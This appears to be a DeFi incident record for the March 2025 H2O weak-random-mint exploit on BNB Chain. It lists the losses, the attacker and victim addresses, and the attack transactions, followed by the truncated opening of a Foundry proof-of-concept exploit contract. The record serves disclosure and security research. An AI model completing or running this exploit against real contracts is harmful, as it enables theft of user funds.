# [?] H2O - Weak Random Mint

## Summary
Severity: Unknown
Chain: BNB Chain
Component: H2O
Published: 2025-03-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/H2O_exp.sol
Type: defi-exploit-poc

## Details
Lost: 22470 USD

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 22470 USD
// Attacker : https://bscscan.com/address/0x8842dd26fd301c74afc4df12e9cdabd9db107d1e
// Attack Contract : https://bscscan.com/address/0x03ca8b574dd4250576f7bccc5707e6214e8c6e0d
// Vulnerable Contract : https://bscscan.com/address/0xe9c4d4f095c7943a9ef5ec01afd1385d011855a1
// Attack Tx 1(Loss profit) : https://bscscan.com/tx/0x729c502a7dfd5332a9bdbcacec97137899ecc82c17d0797b9686a7f9f6005cb7
// Attack Tx 2(revert) : https://bscscan.com/tx/0x3b0891a4eb65d916bb0069c69a51d9ff165bf69f83358e37523d0c275f2739bd
// Attack Tx 3(revert) : https://bscscan.com/tx/0xd97694e02eb94f48887308a945a7e58b62bd6f20b28aaaf2978090e5535f3a8e
// Attack Tx 4(profit) : https://bscscan.com/tx/0x994abe7906a4a955c103071221e5eaa734a30dccdcdaac63496ece2b698a0fc3
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant H2O = 0xe9c4D4f095C7943a9ef5EC01AfD1385D011855A1;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;

address constant pancakeSwapFactoryV2 = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant PancakeV3Pool = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract H2O_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 47_454_899 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        AttackerC attC = new AttackerC();

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/H2O_exp.sol_
